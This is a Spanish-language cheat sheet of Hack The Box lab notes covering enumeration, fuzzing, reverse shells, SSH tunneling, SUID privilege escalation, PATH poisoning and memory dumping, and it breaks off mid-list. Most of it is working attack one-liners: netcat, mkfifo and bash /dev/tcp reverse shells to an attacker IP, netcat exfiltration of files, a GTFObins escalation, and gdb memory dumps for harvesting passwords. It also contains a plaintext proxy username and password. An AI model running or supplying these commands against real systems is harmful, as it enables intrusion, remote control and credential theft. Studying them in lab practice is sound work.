# Aprendiendo de Hackthebox.com

- sitios: 
    - https://brainful.blog/2022/01/19/enumeration-2/

- sitios wordlist: 
    - sub dominios: 
        - https://github.com/theMiddleBlue/DNSenum/blob/master/wordlist/subdomains-top1mil-20000.txt

- sitios payloads:
    - https://github.com/swisskyrepo/PayloadsAllTheThings

- scripts enumeration:
    - https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
    - https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
        - bajarlo `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh`
    - https://github.com/DominicBreuker/pspy enumera los procesos sin necesidad de ser root.

- usando nmap
    - `-sU` scanear puertos UDP
    - `-p80` escanear puerto 80, `-p-` escanear todos los puertos
    - `-sS` tcp syn ping
    - `-v` verbose
    - `-Pn` skip ping
    - `-A` agressive mode, muestra info mas detallada. *tratar de usar solo con los puertos descubiertos.*

- Web Fuzzer (*remplazo de palabras en el url*)
    - `wfuzz -c -z range,1-10 http://www.sitio.com/FUZZ` la palabra **FUZZ** seria remplazada por numeros del 1 al 10.
    - `wfuzz -c -z file,palabras.txt http://www.sitio.com/FUZZ` palabra **FUZZ** seria remplazada por las palabras dentro del archivo.
    - con la opcion `--sc` fitramoslos resultados, p.e. `--sc 200` solo muestra los resultados con *200 OK.f* 
    - `-c` muestra la salida con colores
    - `-w palabras.txt` lo mismo q usar file,palabras.txt
    - `-L` seguir redirecciones.
    - `-H` header p.e. `-H "Host: FUZZ.sitio.htb"

- Reverse shell
    - si se puede subir archivos al sitio se usa un [simple webshell](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985#file-easy-simple-php-webshell-php)
    - [reverse shell cheatsheet](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/).
    - si esta netcat disponible usamos `nc -e /bin/sh 10.0.0.1 1234`
    - si `nc` no soporte la opcion `-e`: 
        - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
    - si no hay **netcat** en la maquina remota usamos `	
nc -lvp 8080` en nuestra maquina y `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` en la remota. la ip 10.0.0.1 es la de nuestra maquina.
    - intentar con `'/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"'`
    - si se conecta usamos:
        - `python3 -c 'import pty;pty.spawn("/bin/bash")'` luego Presionar `Ctrl+Z` e ingresar `stty raw -echo;fg`-c y presionar ENTER dos veces y regresara al reverse shell pero podremos usar ctrl+c y ctrl+z

    - si usamos `sudo -l` y no funciona usamos:
        - [GTFObins](https://gtfobins.github.io/gtfobins/at/) `echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null`

    - bajar un archivo con `nc`:
        - en nuestra pc con ip 10.10.14.81: `nc -nvlp 10.10.14.81 4444 > file`
        - en el pc remoto: `nc 10.10.14.81 4444 < file`

- SSH tunneling
    - ssh -D1234 user@10.10.11.136
    - bajamos el `foxyproxy` y configuramos:
        - proxy type: SOCKS5
        - Proxy IP: 127.0.0.1
        - Port: 1234
        - Send DNS through SOCKS5 proxy: enable
    - para aplicaciones de linea de comandos usamos `proxychains`
        - editamos nano /etc/proxychains.conf
        - opcion: strict_chain
        - socks5 127.0.0.1 1234 daniel HotelBabylon23

- [Buscar archivos SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/) (permisos: rws) para usar el path poison:
    - `find / -user root -perm -4000 -print 2>/dev/null`
    - `find / -perm -u=s -type f 2>/dev/null`
    - `find / -user root -perm -4000 -exec ls -ldb {} \;`
    - [path poisoning](https://betterprogramming.pub/becoming-root-via-a-misconfigured-path-720a52981c93) : 
        - `export PATH=/tmp:$PATH`
        - en /tmp suplantamos el nombe de un commando asi cuando
        se llame a ese comando ejecutara el commando en /tmp.


- Dump memory
    - `gdb -p <FTP_PROCESS_PID>`
    - `(gdb) info proc mappings`
    - `(gdb) q`
    - `(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>`
    - `(gdb) q`
    - `strings /tmp/mem_ftp #User and password` <- buscar strings

- ssh id_rsa reemplazar en maquina atacada:
    - generamos el id_rsa `ssh-keygen -t rsa`
    - 






















